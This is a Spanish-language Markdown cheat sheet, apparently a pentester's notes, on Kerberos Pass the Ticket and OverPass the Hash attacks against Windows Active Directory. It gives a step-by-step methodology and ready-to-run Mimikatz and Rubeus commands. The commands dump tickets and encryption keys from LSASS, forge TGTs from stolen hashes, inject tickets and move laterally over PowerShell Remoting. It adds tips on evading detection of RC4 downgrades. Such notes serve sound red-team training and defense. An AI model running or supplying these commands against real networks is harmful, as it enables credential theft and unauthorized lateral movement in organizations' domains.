---
tags:
  - PTT
  - windows
  - AD
---
## Conceptos Clave (TL;DR)

* Un ataque Pass the Ticket (PtT) utiliza un ticket Kerberos robado en lugar de un hash NTLM para lograr movimiento lateral.

* Requiere un Ticket Granting Ticket (TGT) para solicitar tickets de acceso a cualquier recurso permitido, o un Service Ticket (TGS) para acceder a un recurso específico.

* En Windows, los tickets son procesados y almacenados en memoria por el proceso LSASS.

* La variante "Pass the Key" u "OverPass the Hash" convierte un hash (RC4, AES256) en un TGT completo para usarse en el sistema.

  
## Herramientas Clave

* **Mimikatz:** Extrae tickets (`sekurlsa::tickets`), extrae claves Kerberos (`sekurlsa::ekeys`), inyecta tickets (`kerberos::ptt`) y permite forjar TGTs a partir de hashes.

* **Rubeus:** Extrae tickets en formato Base64 (`dump`), forja TGTs (`asktgt`), inyecta tickets en memoria (`ptt`) y crea procesos de sacrificio (`createnetonly`).

* **PowerShell Remoting / WinRM:** Facilita la ejecución remota de comandos utilizando los tickets inyectados.

  
## Metodología Paso a Paso

1. **Fase 1: Recolección (Harvesting)**
   Se interactúa con LSASS (requiere privilegios de administrador local para recolectar todo) para exportar los tickets activos del sistema. Mimikatz los exporta como archivos `.kirbi` y Rubeus como cadenas Base64.

2. **Fase 2: Falsificación (OverPass the Hash) (Opcional)**
   Si no se tienen tickets válidos pero sí las claves de cifrado o hashes NTLM (RC4/AES) del usuario, se solicita un TGT válido al Domain Controller (KDC).

3. **Fase 3: Inyección (Pass the Ticket)**
   Se carga el ticket robado o falsificado (ya sea `.kirbi` o Base64) en la sesión de inicio de sesión actual (o en una de sacrificio) para que las herramientas nativas lo utilicen transparentemente al autenticarse en la red.

4. **Fase 4: Movimiento Lateral**
   Se accede a recursos remotos (ej. recursos compartidos SMB o PowerShell Remoting) en el contexto del usuario suplantado.

  
## Cheat Sheet de Comandos

```cmd
# Extraer todos los tickets de LSASS y guardarlos como archivos .kirbi

mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```
  
```cmd
# Volcar todos los tickets en memoria directamente en formato Base64 (ideal para copy-paste)

Rubeus.exe dump /nowrap
```
  
```cmd
# Extraer todas las claves de cifrado Kerberos (RC4, AES128, AES256) de LSASS

mimikatz.exe "privilege::debug" "sekurlsa::ekeys" "exit"
```
  
```cmd
# OverPass the Hash (Mimikatz): Usar hash NTLM/RC4 para iniciar CMD inyectando el TGT (requiere admin local)

mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<HASH>" "exit"
```
  
```cmd
# OverPass the Hash (Rubeus): Pedir TGT usando hash AES256 e imprimir en Base64 (no requiere admin)

Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes256:<AES_HASH> /nowrap
```
  
```cmd
# Pass the Ticket (Rubeus): Pedir TGT usando hash RC4 e inyectarlo inmediatamente en la sesión (/ptt)

Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<RC4_HASH> /ptt
```
  
```cmd
# Pass the Ticket (Rubeus): Inyectar un archivo de ticket .kirbi en la sesión actual

Rubeus.exe ptt /ticket:<FILE_PATH>.kirbi
```
  
```cmd
# Pass the Ticket (Rubeus): Inyectar un ticket Kerberos desde una cadena Base64

Rubeus.exe ptt /ticket:<BASE64_STRING>
```
  
```cmd
# Pass the Ticket (Mimikatz): Inyectar archivo .kirbi en la sesión de la consola actual

mimikatz.exe "privilege::debug" "kerberos::ptt <FILE_PATH>.kirbi" "exit"
```
  
```cmd
# Rubeus: Crear un proceso CMD de sacrificio (Logon Type 9) para no sobreescribir el TGT del usuario actual

Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

```powershell
# Convertir un archivo .kirbi físico a una cadena Base64 (para usarlo con Rubeus)

[Convert]::ToBase64String([IO.File]::ReadAllBytes("<FILE_PATH>.kirbi"))

  
# Iniciar sesión interactiva remota tras haber inyectado el ticket (PS Remoting)

Enter-PSSession -ComputerName <TARGET_HOSTNAME>
```

  
## "Gotchas" y Troubleshooting

* **Privilegios de Recolección:** Los usuarios no administrativos solo pueden recolectar sus propios tickets; se necesita ser Administrador Local para extraer los de otros usuarios o del sistema.

* **Reconocimiento de Tickets:** Los tickets exportados que terminan en `$` son de cuentas de computadora. Si el servicio objetivo dice `krbtgt`, el ticket es un TGT.

* **Bug de Encriptación Mimikatz:** En algunas versiones de Windows 10, `sekurlsa::ekeys` de Mimikatz (versiones como 2.2.0 de 2022) muestra incorrectamente todos los hashes como `des_cbc_md4`. Los tickets exportados así fallarán por mala encriptación. Solución: Usar los hashes extraídos para forjar nuevos tickets o usar `Rubeus dump`.

* **Alerta de Degradación de Cifrado (Encryption Downgrade):** Dominios Windows modernos (2008+) usan cifrado AES por defecto. Forjar tickets usando un hash RC4/NTLM en lugar de AES256/AES128 puede ser detectado por los defensores como una anomalía.

* **Rubeus vs Mimikatz (OverPass The Hash):** A diferencia de Mimikatz (`sekurlsa::pth`), Rubeus (`asktgt`) no requiere privilegios administrativos para realizar OverPass the Hash / Pass the Key.

* **Sobrescritura de Sesión:** Para evitar borrar o sobrescribir tu propio ticket TGT en la sesión activa al inyectar uno nuevo, es altamente recomendable usar `Rubeus createnetonly` para inyectar y operar desde un proceso de sacrificio oculto.

* **Requisitos PS Remoting:** Requiere que el usuario comprometido sea Administrador o miembro del grupo "Remote Management Users" en la máquina destino. Los puertos TCP correspondientes son 5985 (HTTP) y 5986 (HTTPS).